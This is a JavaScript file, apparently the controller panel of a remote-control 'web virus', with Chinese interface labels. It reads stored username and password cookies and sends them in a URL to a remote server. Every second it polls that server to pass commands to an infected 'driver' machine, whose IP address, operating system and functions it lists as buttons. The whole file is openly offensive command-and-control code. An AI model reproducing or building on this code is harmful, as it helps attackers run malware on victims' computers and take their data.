

var user = getCookie("user");
var pwd = getCookie("pwd");
var command = 'none';


var hacker_driver_xhr = new XMLHttpRequest();
hacker_driver_xhr.open("GET", remote+ "/api/web_virus/"+user+"/"+pwd, true);
hacker_driver_xhr.send();
hacker_driver_xhr.onload = function() {
    var driver_code = hacker_driver_xhr.responseText;
    document.getElementById("driver_code").innerHTML = "识别码: "+ driver_code;
    print_log("驱动识别码加载成功")


    var local_fn = document.getElementById("local_fn");

    var run = setInterval(function() {
        var get_message = new XMLHttpRequest();
        get_message.open(
            'POST',remote+"/virus_run/"+driver_code+"/" , true);
        get_message.send(JSON.stringify({"command": command}));
        get_message.onload = function() {
        if (get_message.readyState === 4) {
            var r = get_message.responseText;
            if (r.replace('\n','') != 'none'){
                console.log(r);
                try{
                    var message = JSON.parse(r);
                    if ("IP" in message && "os" in message) {
                        document.getElementById("driver_ip").innerText = "IP: "+ message["IP"];
                        document.getElementById("driver_os").innerText = "系统: "+ message["os"];
                        local_fn.innerHTML = "";
                        console.log(message);
                        for (var i in message) {
                            if (i != "IP") {
                                console.log(i);
                                (function(i){
                                    var dom = document.createElement("button");
                                    dom.innerText = i;
                                    dom.id = i;
                                    dom.className = "btn_3";
                                    local_fn.appendChild(dom);
                                }) (i)
                            }
                        }
                    }
                    else {
                        showAlert(r , null)
                    }
                }catch(e){
                    return;
                }
                command = 'none'
            }
        }
    } } , 1000);
}